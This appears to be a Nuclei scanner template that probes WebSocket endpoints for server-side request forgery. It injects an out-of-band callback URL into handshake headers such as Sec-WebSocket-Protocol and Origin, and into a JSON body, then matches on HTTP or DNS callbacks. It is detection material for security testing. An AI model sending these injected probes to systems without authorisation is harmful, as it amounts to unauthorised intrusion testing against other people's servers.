id: websocket-upgrade-oob

info:
  name: WebSocket Upgrade Header Injection OOB Detection
  author: geeknik
  severity: medium
  description: |
    Detects WebSocket endpoints that improperly handle Upgrade headers with external URLs,
    potentially leading to SSRF through WebSocket-Sec-WebSocket-Protocol or custom headers
    that trigger external connections during the WebSocket handshake process.
  reference:
    - https://tools.ietf.org/html/rfc6455
    - https://portswigger.net/web-security/websockets
    - https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/10-Testing_WebSockets
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-918
  tags: websocket,oob,ssrf,upgrade,handshake

variables:
  callback_url: "{{interactsh-url}}"

http:
  - method: GET
    path:
      - "{{BaseURL}}/ws"
      - "{{BaseURL}}/websocket"
      - "{{BaseURL}}/socket.io/"
      - "{{BaseURL}}/api/ws"
      - "{{BaseURL}}/chat"
      - "{{BaseURL}}/live"
      - "{{BaseURL}}/stream"

    headers:
      Upgrade: websocket
      Connection: Upgrade
      Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
      Sec-WebSocket-Version: 13
      Sec-WebSocket-Protocol: "{{callback_url}}"
      Sec-WebSocket-Extensions: "permessage-deflate; server_max_window_bits"

  - method: GET
    path:
      - "{{BaseURL}}/ws"
      - "{{BaseURL}}/websocket"
      - "{{BaseURL}}/socket.io/"
      - "{{BaseURL}}/api/ws"

    headers:
      Upgrade: websocket
      Connection: Upgrade
      Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
      Sec-WebSocket-Version: 13
      X-Forwarded-Proto: "{{callback_url}}"
      Origin: "{{callback_url}}"

  - method: GET
    path:
      - "{{BaseURL}}/ws"
      - "{{BaseURL}}/websocket"
      - "{{BaseURL}}/socket.io/"
      - "{{BaseURL}}/api/ws"

    headers:
      Upgrade: websocket
      Connection: Upgrade
      Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
      Sec-WebSocket-Version: 13
      X-WebSocket-Callback: "{{callback_url}}/callback"
      X-External-Origin: "{{callback_url}}"

  - method: POST
    path:
      - "{{BaseURL}}/ws/connect"
      - "{{BaseURL}}/websocket/handshake"
      - "{{BaseURL}}/api/websocket/init"

    headers:
      Content-Type: application/json
      Accept: application/json

    body: |
      {
        "protocol": "{{callback_url}}",
        "origin": "{{callback_url}}",
        "callback_url": "{{callback_url}}/webhook"
      }

    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "http"
          - "dns"
        condition: or